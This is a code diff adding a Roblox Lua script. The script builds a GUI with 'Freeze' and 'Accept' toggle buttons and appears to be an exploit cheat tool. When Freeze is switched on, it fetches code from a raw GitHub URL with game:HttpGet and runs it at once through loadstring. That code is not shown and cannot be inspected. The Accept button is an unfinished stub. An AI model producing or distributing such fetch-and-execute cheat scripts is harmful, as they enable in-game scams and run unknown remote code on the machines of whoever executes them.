@@ -1,0 +1,55 @@
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local FreezeButton = Instance.new("TextButton")
+local AcceptButton = Instance.new("TextButton")
+
+-- Parent
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Frame Properties
+Frame.Size = UDim2.new(0, 200, 0, 100)
+Frame.Position = UDim2.new(0.5, -100, 0.5, -50)
+Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Frame.Parent = ScreenGui
+
+-- Freeze Button
+FreezeButton.Size = UDim2.new(0, 180, 0, 40)
+FreezeButton.Position = UDim2.new(0, 10, 0, 10)
+FreezeButton.Text = "Freeze: OFF"
+FreezeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+FreezeButton.Parent = Frame
+
+local freezeActive = false
+
+FreezeButton.MouseButton1Click:Connect(function()
+    freezeActive = not freezeActive
+    if freezeActive then
+        FreezeButton.Text = "Freeze: ON"
+        FreezeButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/realarceusx/realarceusx/refs/heads/main/kil"))()
+    else
+        FreezeButton.Text = "Freeze: OFF"
+        FreezeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    end
+end)
+
+-- Accept Button
+AcceptButton.Size = UDim2.new(0, 180, 0, 40)
+AcceptButton.Position = UDim2.new(0, 10, 0, 50)
+AcceptButton.Text = "Accept: OFF"
+AcceptButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+AcceptButton.Parent = Frame
+
+local acceptActive = false
+
+AcceptButton.MouseButton1Click:Connect(function()
+    acceptActive = not acceptActive
+    if acceptActive then
+        AcceptButton.Text = "Accept: ON"
+        AcceptButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+        -- Define what "Accept" should do here
+    else
+        AcceptButton.Text = "Accept: OFF"
+        AcceptButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    end
+end)
